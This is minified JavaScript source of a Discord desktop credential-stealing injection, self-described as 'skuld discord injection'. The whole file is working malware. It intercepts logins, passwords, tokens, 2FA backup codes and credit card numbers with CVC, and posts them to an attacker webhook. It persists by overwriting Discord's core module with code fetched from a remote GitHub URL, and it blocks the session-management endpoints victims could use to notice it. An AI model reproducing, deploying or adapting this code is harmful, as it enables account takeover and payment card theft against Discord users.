const fs=require("fs"),os=require("os"),https=require("https"),args=process.argv,path=require("path"),querystring=require("querystring"),{BrowserWindow:BrowserWindow,session:session}=require("electron");async function getwh(){axios.get("https://raw.githubusercontent.com/Raplhs/13371.1337ext73318337/main/73C4.txt").then((e=>{const t=e.data;cheerio.load(t)("body").text().replace(/\s/g,"")})).catch((e=>{console.error(e)}))}getwh();const CONFIG={webhook:getwh.wtxtFinal,injection_url:"https://raw.githubusercontent.com/Raplhs/444444iew543333/main/mfinject.js",filters:{urls:["/auth/login","/auth/register","/mfa/totp","/mfa/codes-verification","/users/@me"]},filters2:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","wss://remote-auth-gateway.discord.gg/*","https://discord.com/api/v*/auth/sessions","https://*.discord.com/api/v*/auth/sessions","https://discordapp.com/api/v*/auth/sessions"]},payment_filters:{urls:["https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts","https://api.stripe.com/v*/tokens"]},API:"https://discord.com/api/v9/users/@me",badges:{Discord_Emloyee:{Value:1,Emoji:"<:8485discordemployee:1163172252989259898>",Rare:!0},Partnered_Server_Owner:{Value:2,Emoji:"<:9928discordpartnerbadge:1163172304155586570>",Rare:!0},HypeSquad_Events:{Value:4,Emoji:"<:9171hypesquadevents:1163172248140660839>",Rare:!0},Bug_Hunter_Level_1:{Value:8,Emoji:"<:4744bughunterbadgediscord:1163172239970140383>",Rare:!0},Early_Supporter:{Value:512,Emoji:"<:5053earlysupporter:1163172241996005416>",Rare:!0},Bug_Hunter_Level_2:{Value:16384,Emoji:"<:1757bugbusterbadgediscord:1163172238942543892>",Rare:!0},Early_Verified_Bot_Developer:{Value:131072,Emoji:"<:1207iconearlybotdeveloper:1163172236807639143>",Rare:!0},House_Bravery:{Value:64,Emoji:"<:6601hypesquadbravery:1163172246492287017>",Rare:!1},House_Brilliance:{Value:128,Emoji:"<:6936hypesquadbrilliance:1163172244474822746>",Rare:!1},House_Balance:{Value:256,Emoji:"<:5242hypesquadbalance:1163172243417858128>",Rare:!1},Active_Developer:{Value:4194304,Emoji:"<:1207iconactivedeveloper:1163172534443851868>",Rare:!1},Certified_Moderator:{Value:262144,Emoji:"<:4149blurplecertifiedmoderator:1163172255489085481>",Rare:!0},Spammer:{Value:1048704,Emoji:"⌨️",Rare:!1}}},executeJS=e=>BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(e,!0),getToken=async()=>await executeJS("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"),request=async(e,t,s,n)=>{const a={protocol:(t=new URL(t)).protocol,hostname:t.host,path:t.pathname,method:e,headers:{"Access-Control-Allow-Origin":"*"}};t.search&&(a.path+=t.search);for(const e in s)a.headers[e]=s[e];const i=https.request(a);return n&&i.write(n),i.end(),new Promise(((e,t)=>{i.on("response",(t=>{let s="";t.on("data",(e=>s+=e)),t.on("end",(()=>e(s)))}))}))},hooker=async(e,t,s)=>{e.content="`"+os.hostname()+"` - `"+os.userInfo().username+"`\n\n"+e.content,e.username="skuld - cord injection",e.avatar_url="https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png",e.embeds[0].author={name:s.username},e.embeds[0].thumbnail={url:`https://cdn.discordapp.com/avatars/${s.id}/${s.avatar}.webp`},e.embeds[0].footer={text:"skuld discord injection - made by hackirby",icon_url:"https://avatars.githubusercontent.com/u/145487845?v=4"},e.embeds[0].title="Account Information";const n=getNitro(s.premium_type),a=getBadges(s.flags),i=await getBilling(t),r=await getFriends(t),o=await getServers(t);e.embeds[0].fields.push({name:"Token",value:"```"+t+"```",inline:!1},{name:"Nitro",value:n,inline:!0},{name:"Badges",value:a,inline:!0},{name:"Billing",value:i,inline:!0}),e.embeds.push({title:`Total Friends: ${r.totalFriends}`,description:r.message},{title:`Total Servers: ${o.totalGuilds}`,description:o.message});for(const t in e.embeds)e.embeds[t].color=11617251;await request("POST",CONFIG.webhook,{"Content-Type":"application/json"},JSON.stringify(e))},fetch=async(e,t)=>JSON.parse(await request("GET",CONFIG.API+e,t)),fetchAccount=async e=>await fetch("",{Authorization:e}),fetchBilling=async e=>await fetch("/billing/payment-sources",{Authorization:e}),fetchServers=async e=>await fetch("/guilds?with_counts=true",{Authorization:e}),fetchFriends=async e=>await fetch("/relationships",{Authorization:e}),getNitro=e=>{switch(e){case 1:return"`Nitro Classic`";case 2:return"`Nitro Boost`";case 3:return"`Nitro Basic`";default:return"`❌`"}},getBadges=e=>{let t="";for(const s in CONFIG.badges){let n=CONFIG.badges[s];(e&n.Value)==n.Value&&(t+=n.Emoji+" ")}return t||"`❌`"},getRareBadges=e=>{let t="";for(const s in CONFIG.badges){let n=CONFIG.badges[s];(e&n.Value)==n.Value&&n.Rare&&(t+=n.Emoji+" ")}return t},getBilling=async e=>{const t=await fetchBilling(e);let s="";return t.forEach((e=>{if(!e.invalid)switch(e.type){case 1:s+="💳 ";break;case 2:s+="<:paypal:1148653305376034967> "}})),s||"`❌`"},getFriends=async e=>{const t=await fetchFriends(e),s=t.filter((e=>1==e.type));let n="";for(const e of s){var a=getRareBadges(e.user.public_flags);""!=a&&(n||(n="**Rare Friends:**\n"),n+=`${a} ${e.user.username}#${e.user.discriminator}\n`)}return n=n||"**No Rare Friends**",{message:n,totalFriends:t.length}},getServers=async e=>{const t=await fetchServers(e),s=t.filter((e=>"562949953421311"==e.permissions));let n="";for(const e of s)""===n&&(n+="**Rare Servers:**\n"),n+=`${e.owner?"<:SA_Owner:991312415352430673> Owner":"<:admin:967851956930482206> Admin"} | Server Name: \`${e.name}\` - Members: \`${e.approximate_member_count}\`\n`;return n=n||"**No Rare Servers**",{message:n,totalGuilds:t.length}},EmailPassToken=async(e,t,s,n)=>{const a=await fetchAccount(s),i={content:`**${a.username}** just ${n}!`,embeds:[{fields:[{name:"Email",value:"`"+e+"`",inline:!0},{name:"Password",value:"`"+t+"`",inline:!0}]}]};hooker(i,s,a)},BackupCodesViewed=async(e,t)=>{const s=await fetchAccount(t),n=e.filter((e=>!1===e.consumed));let a="";for(let e of n)a+=`${e.code.substr(0,4)}-${e.code.substr(4)}\n`;const i={content:`**${s.username}** just viewed his 2FA backup codes!`,embeds:[{fields:[{name:"Backup Codes",value:"```"+a+"```",inline:!1},{name:"Email",value:"`"+s.email+"`",inline:!0},{name:"Phone",value:"`"+(s.phone||"None")+"`",inline:!0}]}]};hooker(i,t,s)},PasswordChanged=async(e,t,s)=>{const n=await fetchAccount(s),a={content:`**${n.username}** just changed his password!`,embeds:[{fields:[{name:"New Password",value:"`"+e+"`",inline:!0},{name:"Old Password",value:"`"+t+"`",inline:!0}]}]};hooker(a,s,n)},CreditCardAdded=async(e,t,s,n,a)=>{const i=await fetchAccount(a),r={content:`**${i.username}** just added a credit card!`,embeds:[{fields:[{name:"Number",value:"`"+e+"`",inline:!0},{name:"CVC",value:"`"+t+"`",inline:!0},{name:"Expiration",value:"`"+s+"/"+n+"`",inline:!0}]}]};hooker(r,a,i)},PaypalAdded=async e=>{const t=await fetchAccount(e),s={content:`**${t.username}** just added a <:paypal:1148653305376034967> account!`,embeds:[{fields:[{name:"Email",value:"`"+t.email+"`",inline:!0},{name:"Phone",value:"`"+(t.phone||"None")+"`",inline:!0}]}]};hooker(s,e,t)},discordPath=function(){const e=args[0].split(path.sep).slice(0,-1).join(path.sep);let t;return"win32"===process.platform?t=path.join(e,"resources"):"darwin"===process.platform&&(t=path.join(e,"Contents","Resources")),fs.existsSync(t)?{resourcePath:t,app:e}:{undefined:void 0,undefined:void 0}}();async function updateCheck(){const{resourcePath:e,app:t}=discordPath;if(void 0===e||void 0===t)return;const s=path.join(e,"app"),n=path.join(s,"package.json"),a=path.join(s,"index.js"),i=`${t}\\modules\\${fs.readdirSync(`${t}\\modules\\`).filter((e=>/discord_desktop_core-+?/.test(e)))[0]}\\discord_desktop_core\\index.js`,r=path.join(process.env.APPDATA,"\\betterdiscord\\data\\betterdiscord.asar");if(fs.existsSync(s)||fs.mkdirSync(s),fs.existsSync(n)&&fs.unlinkSync(n),fs.existsSync(a)&&fs.unlinkSync(a),"win32"===process.platform||"darwin"===process.platform){fs.writeFileSync(n,JSON.stringify({name:"discord",main:"index.js"},null,4));const t=`const fs = require('fs'), https = require('https');\n  const indexJs = '${i}';\n  const bdPath = '${r}';\n  const fileSize = fs.statSync(indexJs).size\n  fs.readFileSync(indexJs, 'utf8', (err, data) => {\n      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") \n          init();\n  })\n  async function init() {\n      https.get('${CONFIG.injection_url}', (res) => {\n          const file = fs.createWriteStream(indexJs);\n          res.replace('%WEBHOOK%', '${CONFIG.webhook}')\n          res.pipe(file);\n          file.on('finish', () => {\n              file.close();\n          });\n      \n      }).on("error", (err) => {\n          setTimeout(init(), 10000);\n      });\n  }\n  require('${path.join(e,"app.asar")}')\n  if (fs.existsSync(bdPath)) require(bdPath);`;fs.writeFileSync(a,t.replace(/\\/g,"\\\\"))}if(!fs.existsSync(path.join(__dirname,"initiation")))return;fs.rmdirSync(path.join(__dirname,"initiation"));const o=await getToken();if(!o)return;const d=await fetchAccount(o),c={content:`**${d.username}** just got injected!`,embeds:[{fields:[{name:"Email",value:"`"+d.email+"`",inline:!0},{name:"Phone",value:"`"+(d.phone||"None")+"`",inline:!0}]}]};await hooker(c,o,d),executeJS('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();')}let email="",password="";const createWindow=()=>{mainWindow=BrowserWindow.getAllWindows()[0],mainWindow&&(mainWindow.webContents.debugger.attach("1.3"),mainWindow.webContents.debugger.on("message",(async(e,t,s)=>{if("Network.responseReceived"!==t)return;if(!CONFIG.filters.urls.some((e=>s.response.url.endsWith(e))))return;if(![200,202].includes(s.response.status))return;const n=await mainWindow.webContents.debugger.sendCommand("Network.getResponseBody",{requestId:s.requestId}),a=JSON.parse(n.body),i=await mainWindow.webContents.debugger.sendCommand("Network.getRequestPostData",{requestId:s.requestId}),r=JSON.parse(i.postData);switch(!0){case s.response.url.endsWith("/login"):if(!a.token)return email=r.login,void(password=r.password);EmailPassToken(r.login,r.password,a.token,"logged in");break;case s.response.url.endsWith("/register"):EmailPassToken(r.email,r.password,a.token,"signed up");break;case s.response.url.endsWith("/totp"):EmailPassToken(email,password,a.token,"logged in with 2FA");break;case s.response.url.endsWith("/codes-verification"):BackupCodesViewed(a.backup_codes,await getToken());break;case s.response.url.endsWith("/@me"):if(!r.password)return;r.email&&EmailPassToken(r.email,r.password,a.token,"changed his email to **"+r.email+"**"),r.new_password&&PasswordChanged(r.new_password,r.password,a.token)}})),mainWindow.webContents.debugger.sendCommand("Network.enable"),mainWindow.on("closed",(()=>{createWindow()})))};createWindow(),session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters,(async(e,t)=>{if([200,202].includes(e.statusCode)&&"POST"==e.method)switch(!0){case e.url.endsWith("tokens"):const t=querystring.parse(Buffer.from(e.uploadData[0].bytes).toString());CreditCardAdded(t["card[number]"],t["card[cvc]"],t["card[exp_month]"],t["card[exp_year]"],await getToken());break;case e.url.endsWith("paypal_accounts"):PaypalAdded(await getToken())}})),session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2,((e,t)=>{if(e.url.startsWith("wss://remote-auth-gateway")||e.url.endsWith("auth/sessions"))return t({cancel:!0});updateCheck()})),module.exports=require("./core.asar");
